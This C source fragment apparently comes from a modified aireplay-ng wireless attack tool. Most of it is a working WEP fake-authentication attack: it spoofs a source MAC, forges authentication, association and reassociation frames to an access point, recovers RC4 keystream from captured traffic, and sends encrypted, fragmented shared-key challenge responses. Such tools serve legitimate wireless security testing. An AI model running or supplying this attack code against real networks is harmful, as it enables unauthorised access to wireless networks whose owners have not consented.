        pfh_out.snaplen       = 65535;
        pfh_out.linktype      = LINKTYPE_IEEE802_11;

        lt = localtime( (const time_t *) &tv.tv_sec );

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                "replay_src-%02d%02d-%02d%02d%02d.cap",
                lt->tm_mon + 1, lt->tm_mday,
                lt->tm_hour, lt->tm_min, lt->tm_sec );

        printf( "Saving chosen packet in %s\n", strbuf );

        if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
        {
            perror( "fopen failed" );
            return( 1 );
        }

        n = sizeof( struct pcap_file_header );

        if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed\n" );
            return( 1 );
        }

        pkh.tv_sec  = tv.tv_sec;
        pkh.tv_usec = tv.tv_usec;
        pkh.caplen  = *caplen;
        pkh.len     = *caplen;

        n = sizeof( pkh );

        if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed" );
            return( 1 );
        }

        n = pkh.caplen;

        if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed" );
            return( 1 );
        }

        fclose( f_cap_out );
    }

    return( 0 );
}

int read_prga(unsigned char **dest, char *file)
{
    FILE *f;
    int size;

    if(file == NULL) return( 1 );
    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);

    f = fopen(file, "r");

    if(f == NULL)
    {
         printf("Error opening %s\n", file);
         return( 1 );
    }

    fseek(f, 0, SEEK_END);
    size = ftell(f);
    rewind(f);

    if(size > 1500) size = 1500;

    if( fread( (*dest), size, 1, f ) != 1 )
    {
    	fclose(f);
        fprintf( stderr, "fread failed\n" );
        return( 1 );
    }

    opt.prgalen = size;

    fclose(f);
    return( 0 );
}

void add_icv(unsigned char *input, int len, int offset)
{
    unsigned long crc = 0xFFFFFFFF;
    int n=0;

    for( n = offset; n < len; n++ )
        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);

    crc = ~crc;

    input[len]   = (crc      ) & 0xFF;
    input[len+1] = (crc >>  8) & 0xFF;
    input[len+2] = (crc >> 16) & 0xFF;
    input[len+3] = (crc >> 24) & 0xFF;

    return;
}

void send_fragments(unsigned char *packet, int packet_len, unsigned char *iv, unsigned char *keystream, int fragsize, int ska)
{
    int t, u;
    int data_size;
    unsigned char frag[32+fragsize];
    int pack_size;
    int header_size=24;

    data_size = packet_len-header_size;
    packet[23] = (rand() % 0xFF);

    for (t=0; t+=fragsize;)
    {

    //Copy header
        memcpy(frag, packet, header_size);

    //Copy IV + KeyIndex
        memcpy(frag+header_size, iv, 4);

    //Copy data
        if(fragsize <= packet_len-(header_size+t-fragsize))
            memcpy(frag+header_size+4, packet+header_size+t-fragsize, fragsize);
        else
            memcpy(frag+header_size+4, packet+header_size+t-fragsize, packet_len-(header_size+t-fragsize));

    //Make ToDS frame
        if(!ska)
        {
            frag[1] |= 1;
            frag[1] &= 253;
        }

    //Set fragment bit
        if (t< data_size) frag[1] |= 4;
        if (t>=data_size) frag[1] &= 251;

    //Fragment number
        frag[22] = 0;
        for (u=t; u-=fragsize;)
        {
            frag[22] += 1;
        }
//        frag[23] = 0;

    //Calculate packet length
        if(fragsize <= packet_len-(header_size+t-fragsize))
            pack_size = header_size + 4 + fragsize;
        else
            pack_size = header_size + 4 + (packet_len-(header_size+t-fragsize));

    //Add ICV
        add_icv(frag, pack_size, header_size + 4);
        pack_size += 4;

    //Encrypt
        xor_keystream(frag + header_size + 4, keystream, fragsize+4);

    //Send
        send_packet(frag, pack_size);
        if (t<data_size)usleep(100);

        if (t>=data_size) break;
    }

}


int do_attack_fake_auth( void )
{
    time_t tt, tr;
    struct timeval tv, tv2, tv3;

    fd_set rfds;
    int i, n, state, caplen, z;
    int mi_b, mi_s, mi_d;
    int x_send;
    int kas;
    int tries;
    int retry = 0;
    int abort;
    int gotack = 0;
    unsigned char capa[2];
    int deauth_wait=3;
    int ska=0;
    int keystreamlen=0;
    int challengelen=0;
    int weight[16];
    int notice=0;
    int packets=0;
    int aid=0;

    unsigned char ackbuf[14];
    unsigned char ctsbuf[10];
    unsigned char iv[4];
    unsigned char challenge[2048];
    unsigned char keystream[2048];

    memset(iv, 0, sizeof(iv));
    if(stop_att)
        return 1;   
    if( memcmp( opt.r_smac,  NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a source MAC (-h).\n" );
        snprintf(info_buffer, sizeof(info_buffer), "Please specify a source MAC (-h).\n" );
        info_message(info_buffer, UPDATE_ERROR);
        return( 1 );
    }

    if(getnet(capa, 0, 1) != 0)
        return 1;

    if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
    {
        printf( "Please specify an ESSID (-e).\n" );
        snprintf(info_buffer, sizeof(info_buffer), "Please specify an ESSID (-e).\n");
        info_message(info_buffer, UPDATE_ERROR);
        return 1;
    }
    if(stop_att)
        return 1; 
    memcpy( ackbuf, "\xD4\x00\x00\x00", 4 );
    memcpy( ackbuf +  4, opt.r_bssid, 6 );
    memset( ackbuf + 10, 0, 4 );

    memcpy( ctsbuf, "\xC4\x00\x94\x02", 4 );
    memcpy( ctsbuf +  4, opt.r_bssid, 6 );

    tries = 0;
    abort = 0;
    state = 0;
    x_send=opt.npackets;
    if(opt.npackets == 0)
        x_send=4;

    if(opt.prga != NULL)
        ska=1;

    tt = time( NULL );
    tr = time( NULL );

    while( 1 )
    {
        if(stop_att)
            return 1; 
        switch( state )
        {
            case 0:
				if (opt.f_retry > 0) {
					if (retry == opt.f_retry) {
						abort = 1;
						return 1;
					}
					++retry;
				}

                if(ska && keystreamlen == 0)
                {
                    opt.fast = 1;  //don't ask for approval
                    memcpy(opt.f_bssid, opt.r_bssid, 6);    //make the filter bssid the same, that is used for auth'ing
                    if(opt.prga==NULL)
                    {
                        while(keystreamlen < 16)
                        {
                            capture_ask_packet(&caplen, 1);    //wait for data packet
                            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
                            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                                z+=2;

                            memcpy(iv, h80211+z, 4); //copy IV+IDX
                            i = known_clear(keystream, &keystreamlen, weight, h80211, caplen-z-4-4); //recover first bytes
                            if(i>1)
                            {
                                keystreamlen=0;
                            }
                            for(i=0;i<keystreamlen;i++)
                                keystream[i] ^= h80211[i+z+4];
                        }
                    }
                    else
                    {
                        keystreamlen = opt.prgalen-4;
                        memcpy(iv, opt.prga, 4);
                        memcpy(keystream, opt.prga+4, keystreamlen);
                    }
                }

                if(stop_att)
                    return 1; 
                state = 1;
                tt = time( NULL );

                /* attempt to authenticate */

                memcpy( h80211, AUTH_REQ, 30 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );
                if(ska)
                    h80211[24]=0x01;
                if(stop_att)
                    return 1; 
                printf("\n");
                PCT; printf( "Sending Authentication Request" );
                snprintf(info_buffer, sizeof(info_buffer), "Sending Authentication Request\n");
                info_message(info_buffer, UPDATE_RUNNING);
                
                if(!ska) {
                    printf(" (Open System)");
                    snprintf(info_buffer, sizeof(info_buffer), "(Open System)\n");
                    info_message(info_buffer, UPDATE_RUNNING);
                } else {
                    printf(" (Shared Key)");
                    snprintf(info_buffer, sizeof(info_buffer), "(Shared Key)\n");
                    info_message(info_buffer, UPDATE_RUNNING);
                }
                fflush( stdout );
                gotack=0;

                for( i = 0; i < x_send; i++ )
                {
                    if(stop_att)
                        return 1; 
                    if( send_packet( h80211, 30 ) < 0 )
                        return( 1 );

                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 1:

                /* waiting for an authentication response */

                if( time( NULL ) - tt >= 2 )
                {
                    if(stop_att)
                        return 1; 
                    if(opt.npackets > 0)
                    {
                        tries++;

                        if( tries > 15  )
                        {
                            abort = 1;
                        }
                    }
                    else
                    {
                        if( x_send < 256 )
                        {
                            x_send *= 2;
                        }
                        else
                        {
                            abort = 1;
                        }
                    }

                    if( abort )
                    {
                        printf(
    "\nAttack was unsuccessful. Possible reasons:\n\n"
    "    * Perhaps MAC address filtering is enabled.\n"
    "    * Check that the BSSID (-a option) is correct.\n"
    "    * Try to change the number of packets (-o option).\n"
    "    * The driver/card doesn't support injection.\n"
    "    * This attack sometimes fails against some APs.\n"
    "    * The card is not on the same channel as the AP.\n"
    "    * You're too far from the AP. Get closer, or lower\n"
    "      the transmit rate.\n\n" );

                        snprintf(info_buffer, sizeof(info_buffer), "\nAttack was unsuccessful. Possible reasons:\n\n"
    "    * Perhaps MAC address filtering is enabled.\n"
    "    * Check that the BSSID (-a option) is correct.\n"
    "    * Try to change the number of packets (-o option).\n"
    "    * The driver/card doesn't support injection.\n"
    "    * This attack sometimes fails against some APs.\n"
    "    * The card is not on the same channel as the AP.\n"
    "    * You're too far from the AP. Get closer, or lower\n"
    "      the transmit rate.\n\n" );
                        info_message(info_buffer, UPDATE_ERROR);
                        return( 1 );
                    }

                    state = 0;
                    challengelen = 0;
                    printf("\n");
                }

                break;

            case 2:
                if(stop_att)
                        return 1; 
                state = 3;
                tt = time( NULL );

                /* attempt to authenticate using ska */

                memcpy( h80211, AUTH_REQ, 30 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );
                h80211[1] |= 0x40; //set wep bit, as this frame is encrypted
                memcpy(h80211+24, iv, 4);
                memcpy(h80211+28, challenge, challengelen);
                h80211[28] = 0x01; //its always ska in state==2
                h80211[30] = 0x03; //auth sequence number 3
                fflush(stdout);

                if(keystreamlen < challengelen+4 && notice == 0)
                {
                    notice = 1;
                    if(opt.prga != NULL)
                    {
                        PCT; printf( "Specified xor file (-y) is too short, you need at least %d keystreambytes.\n", challengelen+4);
                        if(stop_att)
                            return 1;
                        snprintf(info_buffer, sizeof(info_buffer), "Specified xor file (-y) is too short, you need at least %d keystreambytes.\n", challengelen+4);
                        info_message(info_buffer, UPDATE_ERROR);
                    }
                    else
                    {
                        PCT; printf( "You should specify a xor file (-y) with at least %d keystreambytes\n", challengelen+4);
                        if(stop_att)
                            return 1;
                        snprintf(info_buffer, sizeof(info_buffer), "You should specify a xor file (-y) with at least %d keystreambytes\n", challengelen+4);
                        info_message(info_buffer, UPDATE_ERROR);
                    }
                    PCT; printf( "Trying fragmented shared key fake auth.\n");
                    if(stop_att)
                        return 1;
                    snprintf(info_buffer, sizeof(info_buffer), "Trying fragmented shared key fake auth.\n");
                    info_message(info_buffer, UPDATE_RUNNING);
                }
                PCT; printf( "Sending encrypted challenge." );
                fflush( stdout );
                if(stop_att)
                    return 1;
                snprintf(info_buffer, sizeof(info_buffer), "Sending encrypted challenge\n" );
                info_message(info_buffer, UPDATE_RUNNING);
                gotack=0;
                gettimeofday(&tv2, NULL);

                for( i = 0; i < x_send; i++ )
                {
                    if(keystreamlen < challengelen+4)
                    {
                        packets=(challengelen)/(keystreamlen-4);
                        if( (challengelen)%(keystreamlen-4) != 0 )
                            packets++;

                        memcpy(h80211+24, challenge, challengelen);
                        h80211[24]=0x01;
                        h80211[26]=0x03;
                        send_fragments(h80211, challengelen+24, iv, keystream, keystreamlen-4, 1);
                    }
                    else
                    {
                        add_icv(h80211, challengelen+28, 28);
                        xor_keystream(h80211+28, keystream, challengelen+4);
                        send_packet(h80211, 24+4+challengelen+4);
                    }

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 3:
                if(stop_att)
                    return 1; 
                /* waiting for an authentication response (using ska) */

                if( time( NULL ) - tt >= 2 )
                {
                    if(opt.npackets > 0)
                    {
                        tries++;

                        if( tries > 15  )
                        {
                            abort = 1;
                        }
                    }
                    else
                    {
                        if( x_send < 256 )
                        {
                            x_send *= 2;
                        }
                        else
                        {
                            abort = 1;
                        }
                    }

                    if( abort )
                    {
                        printf(
    "\nAttack was unsuccessful. Possible reasons:\n\n"
    "    * Perhaps MAC address filtering is enabled.\n"
    "    * Check that the BSSID (-a option) is correct.\n"
    "    * Try to change the number of packets (-o option).\n"
    "    * The driver/card doesn't support injection.\n"
    "    * This attack sometimes fails against some APs.\n"
    "    * The card is not on the same channel as the AP.\n"
    "    * You're too far from the AP. Get closer, or lower\n"
    "      the transmit rate.\n\n" );
                        snprintf(info_buffer, sizeof(info_buffer), 
    "\nAttack was unsuccessful. Possible reasons:\n\n"
    "    * Perhaps MAC address filtering is enabled.\n"
    "    * Check that the BSSID (-a option) is correct.\n"
    "    * Try to change the number of packets (-o option).\n"
    "    * The driver/card doesn't support injection.\n"
    "    * This attack sometimes fails against some APs.\n"
    "    * The card is not on the same channel as the AP.\n"
    "    * You're too far from the AP. Get closer, or lower\n"
    "      the transmit rate.\n\n" );
                info_message(info_buffer, UPDATE_ERROR);
                        return( 1 );
                    }

                    state = 0;
                    challengelen=0;
                    printf("\n");
                }

                break;

            case 4:
                if(stop_att)
                    return 1; 
                tries = 0;
                state = 5;
                if(opt.npackets == -1) x_send *= 2;
                tt = time( NULL );

                /* attempt to associate */

                memcpy( h80211, ASSOC_REQ, 28 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );

                n = strlen( opt.r_essid );
                if( n > 32 ) n = 32;

                h80211[28] = 0x00;
                h80211[29] = n;

                memcpy( h80211 + 30, opt.r_essid,  n );
                memcpy( h80211 + 30 + n, RATES, 16 );
                memcpy( h80211 + 24, capa, 2);
                if(stop_att)
                    return 1; 
                PCT; printf( "Sending Association Request" );
                fflush( stdout );
                snprintf(info_buffer, sizeof(info_buffer), "Sending Association Request\n");
                info_message(info_buffer, UPDATE_RUNNING);
                gotack=0;

                for( i = 0; i < x_send; i++ )
                {
                    if(stop_att)
                        return 1; 
                    if( send_packet( h80211, 46 + n ) < 0 )
                        return( 1 );

                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 5:

                if(stop_att)
                    return 1; 
                /* waiting for an association response */

                if( time( NULL ) - tt >= 5 )
                {
                    if( x_send < 256 && (opt.npackets == -1) )
                        x_send *= 4;

                    state = 0;
                    challengelen = 0;
                    printf("\n");
                }

                break;

            case 6:
                if(stop_att)
                    return 1; 
                if( opt.a_delay == 0 && opt.reassoc == 0 )
                {
                    printf("\n");
                    return( 0 );
                }

                if( opt.a_delay == 0 && opt.reassoc == 1 )
                {   
                    if(stop_att)
                    return 0;
                    if(opt.npackets == -1) x_send = 4;
                    state = 7;
                    challengelen = 0;
                    break;
                }

                if( time( NULL ) - tt >= opt.a_delay )
                {
                    if(opt.npackets == -1) x_send = 4;
                    if( opt.reassoc == 1 ) state = 7;
                    else state = 0;
                    challengelen = 0;
                    break;
                }

                if( time( NULL ) - tr >= opt.delay )
                {
                    tr = time( NULL );
                    if(stop_att)
                        return 1;
                    printf("\n");
                    PCT; printf( "Sending keep-alive packet" );
                    snprintf(info_buffer, sizeof(info_buffer), "Sending keep-alive packet\n");
                    info_message(info_buffer, UPDATE_RUNNING);
                    fflush( stdout );
                    gotack=0;

                    memcpy( h80211, NULL_DATA, 24 );
                    memcpy( h80211 +  4, opt.r_bssid, 6 );
                    memcpy( h80211 + 10, opt.r_smac,  6 );
                    memcpy( h80211 + 16, opt.r_bssid, 6 );

                    if( opt.npackets > 0 ) kas = opt.npackets;
                    else kas = 32;

                    for( i = 0; i < kas; i++ )
                        if(stop_att)
                            return 1; 
                        if( send_packet( h80211, 24 ) < 0 )
                            return( 1 );
                }

                break;

            case 7:
                if(stop_att)
                    return 1; 
                /* sending reassociation request */

                tries = 0;
                state = 8;
                if(opt.npackets == -1) x_send *= 2;
                tt = time( NULL );

                /* attempt to reassociate */

                memcpy( h80211, REASSOC_REQ, 34 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );

                n = strlen( opt.r_essid );
                if( n > 32 ) n = 32;

                h80211[34] = 0x00;
                h80211[35] = n;

                memcpy( h80211 + 36, opt.r_essid,  n );
                memcpy( h80211 + 36 + n, RATES, 16 );
                memcpy( h80211 + 30, capa, 2);
                if(stop_att)
                    return 1;
                PCT; printf( "Sending Reassociation Request" );
                fflush( stdout );
                snprintf(info_buffer, sizeof(info_buffer), "Sending Reassociation Request\n");
                info_message(info_buffer, UPDATE_RUNNING);
                gotack=0;

                for( i = 0; i < x_send; i++ )
                {
                    if(stop_att)
                        return 1; 
                    if( send_packet( h80211, 52 + n ) < 0 )
                        return( 1 );

                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 8:
                if(stop_att)
                    return 1; 
                /* waiting for a reassociation response */

                if( time( NULL ) - tt >= 5 )
                {
                    if( x_send < 256 && (opt.npackets == -1) )
                        x_send *= 4;

                    state = 7;
                    challengelen = 0;
                    printf("\n");
                }

                break;

            default: break;
        }

        /* read one frame */

        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        tv.tv_sec  = 1;
        tv.tv_usec = 0;

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
        {
            if(stop_att)
                    return 0;
            if( errno == EINTR ) continue;
            perror( "select failed" );
            return( 1 );
        }

        if( ! FD_ISSET( dev.fd_in, &rfds ) )
            continue;

        caplen = read_packet( h80211, sizeof( h80211 ), NULL );

        if( caplen  < 0 ) return( 1 );
        if( caplen == 0 ) continue;

        if( caplen == 10 && h80211[0] == 0xD4)
        {
            if( memcmp(h80211+4, opt.r_smac, 6) == 0 )
            {
                gotack++;
                if(gotack==1)
                {
                    if(stop_att)
                        return 1;
                    printf(" [ACK]");
                    fflush( stdout );
                    snprintf(info_buffer, sizeof(info_buffer), "[ACK]\n");
                    info_message(info_buffer, UPDATE_SUCCESS);
                }
            }
        }

        gettimeofday(&tv3, NULL);

        //wait 100ms for acks
        if ( (((tv3.tv_sec*1000000 - tv2.tv_sec*1000000) + (tv3.tv_usec - tv2.tv_usec)) > (100*1000)) &&
              (gotack > 0) && (gotack < packets) && (state == 3) && (packets > 1) )
        {
            if(stop_att)
                    return 1;
            PCT; printf("Not enough acks, repeating...\n");
            snprintf(info_buffer, sizeof(info_buffer), "Not enough acks, repeating...\n");
            info_message(info_buffer, UPDATE_RUNNING);
            state=2;
            continue;
        }

        if( caplen < 24 )
            continue;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
            default: mi_b = 10; mi_d = 16; mi_s = 24; break;
        }

        /* check if the dest. MAC is ours and source == AP */

        if( memcmp( h80211 + mi_d, opt.r_smac,  6 ) == 0 &&
            memcmp( h80211 + mi_b, opt.r_bssid, 6 ) == 0 &&
            memcmp( h80211 + mi_s, opt.r_bssid, 6 ) == 0 )
        {
            /* check if we got an deauthentication packet */
            if(stop_att)
                return 1;
            if( h80211[0] == 0xC0 ) //removed && state == 4
            {
                
                printf("\n");
                PCT; printf( "Got a deauthentication packet! (Waiting %d seconds)\n", deauth_wait );
                snprintf(info_buffer, sizeof(info_buffer), "Got a disassociation packet! (Waiting %d seconds)\n", deauth_wait);
                info_message(info_buffer, UPDATE_RUNNING);

                if(opt.npackets == -1) x_send = 4;
                state = 0;
                challengelen = 0;
                read_sleep( deauth_wait * 1000000UL );
                deauth_wait += 2;
                if(stop_att)
                    return 1;
                continue;
            }

            /* check if we got an disassociation packet */

            if( h80211[0] == 0xA0 && state == 6 )
            {
                if(stop_att)
                    return 1;
                printf("\n");
                PCT; printf( "Got a disassociation packet! (Waiting %d seconds)\n", deauth_wait );
                snprintf(info_buffer, sizeof(info_buffer), "Got a disassociation packet! (Waiting %d seconds)\n", deauth_wait);
                info_message(info_buffer, UPDATE_RUNNING);
                
                if(opt.npackets == -1) x_send = 4;
                state = 0;
                challengelen = 0;
                read_sleep( deauth_wait );
                deauth_wait += 2;
                if(stop_att)
                    return 1;
                continue;
            }

            /* check if we got an authentication response */

            if(stop_att)
                    return 1;
            if( h80211[0] == 0xB0 && (state == 1 || state == 3) )
            {
                if(ska)
                {
                    if( (state==1 && h80211[26] != 0x02) || (state==3 && h80211[26] != 0x04) )
                        continue;
                }

                printf("\n");
                PCT;

                state = 0;

                if( caplen < 30 )
                {
                    if(stop_att)
                    return 1;
                    printf( "Error: packet length < 30 bytes\n" );
                    snprintf(info_buffer, sizeof(info_buffer), "Error: packet length < 30 bytes\n");
                    info_message(info_buffer, UPDATE_ERROR);
                    read_sleep( 3*1000000 );
                    challengelen = 0;
                    if(stop_att)
                        return 1;
                    continue;
                }

                if( (h80211[24] != 0 || h80211[25] != 0) && ska==0)
                {
                    if(stop_att)
                    return 0;
                    ska=1;
                    printf("Switching to shared key authentication\n");
                    snprintf(info_buffer, sizeof(info_buffer), "Switching to shared key authentication\n");
                    info_message(info_buffer, UPDATE_RUNNING);
                    read_sleep(2*1000000);  //read sleep 2s
                    challengelen = 0;
                    if(stop_att)
                        return 1;
                    continue;
                }

                n = h80211[28] + ( h80211[29] << 8 );

                if( n != 0 )
                {
                    switch( n )
                    {
                    case  1:
                    if(stop_att)
                        return 1;
                        printf( "AP rejects the source MAC address (%02X:%02X:%02X:%02X:%02X:%02X) ?\n",
                                opt.r_smac[0], opt.r_smac[1], opt.r_smac[2],
                                opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
                        snprintf(info_buffer, sizeof(info_buffer),"AP rejects the source MAC address (%02X:%02X:%02X:%02X:%02X:%02X) ?\n",
                                opt.r_smac[0], opt.r_smac[1], opt.r_smac[2],
                                opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
                        info_message(info_buffer, UPDATE_ERROR);
                        break;

                    case 10:
                    if(stop_att)
                        return 1;
                        printf( "AP rejects our capabilities\n" );
                        snprintf(info_buffer, sizeof(info_buffer), "AP rejects our capabilities\n");
                        info_message(info_buffer, UPDATE_ERROR);
                        break;

                    case 13:
                    case 15:
                        ska=1;
                        if(h80211[26] == 0x02) {
                            if(stop_att)
                                return 1;
                            printf("Switching to shared key authentication\n");
                            snprintf(info_buffer, sizeof(info_buffer), "Switching to shared key authentication\n");
                            info_message(info_buffer, UPDATE_RUNNING);
                        }
                        if(h80211[26] == 0x04)
                        {
                            if(stop_att)
                                return 1;
                            printf("Challenge failure\n");
                            snprintf(info_buffer, sizeof(info_buffer), "Challenge failure\n");
                            info_message(info_buffer, UPDATE_ERROR);
                            challengelen=0;
                        }
                        read_sleep(2*1000000);  //read sleep 2s
                        challengelen = 0;
                        continue;
                    default:
                        break;
                    }
                    if(stop_att)
                        return 1;
                    printf( "Authentication failed (code %d)\n", n );
                    snprintf(info_buffer, sizeof(info_buffer), "Authentication failed (code %d)\n", n );
                    info_message(info_buffer, UPDATE_ERROR);
                    
                    if(opt.npackets == -1) x_send = 4;
                    read_sleep( 3*1000000 );
                    challengelen = 0;
                    if(stop_att)
                        return 1;
                    continue;
                }

                if(ska && h80211[26]==0x02 && challengelen == 0)
                {
                    memcpy(challenge, h80211+24, caplen-24);
                    challengelen=caplen-24;
                }
                if(ska)
                {
                    if(h80211[26]==0x02)
                    {
                        if(stop_att)
                            return 1;
                        state = 2;      /* grab challenge */
                        snprintf(info_buffer, sizeof(info_buffer), "Authentication 1/2 successful\n");
                        info_message(info_buffer, UPDATE_SUCCESS);
                        printf( "Authentication 1/2 successful\n" );
                    }
                    if(h80211[26]==0x04)
                    {
                        if(stop_att)
                            return 1;
                        state = 4;
                         snprintf(info_buffer, sizeof(info_buffer), "Authentication 2/2 successful\n");
                    info_message(info_buffer, UPDATE_SUCCESS);
                        printf( "Authentication 2/2 successful\n" );
                    }
                }
                else
                {
                    if(stop_att)
                        return 1;
                    snprintf(info_buffer, sizeof(info_buffer), "Authentication successful\n");
                    info_message(info_buffer, UPDATE_SUCCESS);
                    printf( "Authentication successful\n" );
                    state = 4;      /* auth. done */
                }
            }

            /* check if we got an association response */

            if( h80211[0] == 0x10 && state == 5 )
            {
                printf("\n");
                state = 0; PCT;

                if( caplen < 30 )
                {
                    if(stop_att)
                        return 1;
                    snprintf(info_buffer, sizeof(info_buffer), "Error: packet length < 30 bytes\n");
                    info_message(info_buffer, UPDATE_ERROR);
                    printf( "Error: packet length < 30 bytes\n" );
                    sleep( 3 );
                    challengelen = 0;
                    continue;
                }

                n = h80211[26] + ( h80211[27] << 8 );

                if( n != 0 )
                {
                    if(stop_att)
                        return 1;
                    switch( n )
                    {
                    case  1:
                        
                        printf( "Denied (code  1), is WPA in use ?\n" );
                        snprintf(info_buffer, sizeof(info_buffer), "Denied (code  1), is WPA in use ?\n");
                        info_message(info_buffer, UPDATE_ERROR);
                        break;

                    case 10:
                        
                        printf( "Denied (code 10), open (no WEP) ?\n" );
                        snprintf(info_buffer, sizeof(info_buffer), "Denied (code 10), open (no WEP) ?\n");
                        info_message(info_buffer, UPDATE_ERROR);
                        break;

                    case 12:
                   
                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
                        snprintf(info_buffer, sizeof(info_buffer), "Denied (code 12), wrong ESSID or WPA ?\n");
                        info_message(info_buffer, UPDATE_ERROR);
                        break;

                    default:
                        printf( "Association denied (code %d)\n", n );
                        snprintf(info_buffer, sizeof(info_buffer), "Association denied (code %d)\n", n);
                        info_message(info_buffer, UPDATE_ERROR);
                        break;
                    }

                    sleep( 3 );
                    challengelen = 0;
                    continue;
                }

                aid=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);
                if(stop_att)
                    return 1;
                snprintf(info_buffer, sizeof(info_buffer), "Association successful :-) (AID: %d)\n", aid);
                info_message(info_buffer, UPDATE_SUCCESS);
                printf( "Association successful :-) (AID: %d)\n", aid );
                deauth_wait = 3;
                fflush( stdout );

                tt = time( NULL );
                tr = time( NULL );

                state = 6;      /* assoc. done */
            }

            /* check if we got an reassociation response */
            if(stop_att)
                return 1;
            if( h80211[0] == 0x30 && state == 8 )
            {
                printf("\n");
                state = 7; PCT;

                if( caplen < 30 )
                {
                    if(stop_att)
                    return 1;
                    printf( "Error: packet length < 30 bytes\n" );
                    snprintf(info_buffer, sizeof(info_buffer), "Error: packet length < 30 bytes\n");
                        info_message(info_buffer, UPDATE_ERROR);
                    sleep( 3 );
                    challengelen = 0;
                    continue;
                }

                n = h80211[26] + ( h80211[27] << 8 );

                if( n != 0 )
                {
                    if(stop_att)
                        return 1;
                    switch( n )
                    {
                    case  1:
                        
                        printf( "Denied (code  1), is WPA in use ?\n" );
                        snprintf(info_buffer, sizeof(info_buffer),  "Denied (code  1), is WPA in use ?\n" );
                        info_message(info_buffer, UPDATE_ERROR);
                        break;

                    case 10:
            
                        printf( "Denied (code 10), open (no WEP) ?\n" );
                        snprintf(info_buffer, sizeof(info_buffer), "Denied (code 10), open (no WEP) ?\n");
                        info_message(info_buffer, UPDATE_ERROR);
                        break;

                    case 12:
                       
                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
                        snprintf(info_buffer, sizeof(info_buffer), "Denied (code 12), wrong ESSID or WPA ?\n");
                        info_message(info_buffer, UPDATE_ERROR);
                        break;

                    default:
                     
                        printf( "Reassociation denied (code %d)\n", n );
                        snprintf(info_buffer, sizeof(info_buffer), "Reassociation denied (code %d)\n", n );
                        info_message(info_buffer, UPDATE_ERROR);
                        break;
                    }

                    sleep( 3 );
                    challengelen = 0;
                    continue;
                }

                aid=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);
                if(stop_att)
                    return 1;
                printf( "Reassociation successful :-) (AID: %d)\n", aid );
                snprintf(info_buffer, sizeof(info_buffer), "Reassociation successful :-) (AID: %d)\n", aid);
                        info_message(info_buffer, UPDATE_SUCCESS);
                deauth_wait = 3;
                fflush( stdout );

                tt = time( NULL );
                tr = time( NULL );

                state = 6;      /* reassoc. done */
            }
        }
    }

    return( 0 );
}


    





void save_prga(char *filename, unsigned char *iv, unsigned char *prga, int prgalen)
{
    FILE *xorfile;
    size_t unused;
    xorfile = fopen(filename, "wb");
    unused = fwrite (iv, 1, 4, xorfile);
    unused = fwrite (prga, 1, prgalen, xorfile);
    fclose (xorfile);
}


static int get_ip_port(char *iface, char *ip, const int ip_size)
{
	char *host;
	char *ptr;
	int port = -1;
	struct in_addr addr;

	host = strdup(iface);
	if (!host)
		return -1;

	ptr = strchr(host, ':');
	if (!ptr)
		goto out;

	*ptr++ = 0;

	if (!inet_aton(host, (struct in_addr *)&addr))
		goto out; /* XXX resolve hostname */

	if(strlen(host) > 15)
        {
            port = -1;
            goto out;
        }
	strncpy(ip, host, ip_size);
	port = atoi(ptr);
        if(port <= 0) port = -1;

out:
	free(host);
	return port;
}



struct net_hdr {
	uint8_t		nh_type;
	uint32_t	nh_len;
	uint8_t		nh_data[0];
} __packed;


void stop_attack_fakeauth(int running) {
    stop_att = running;
}

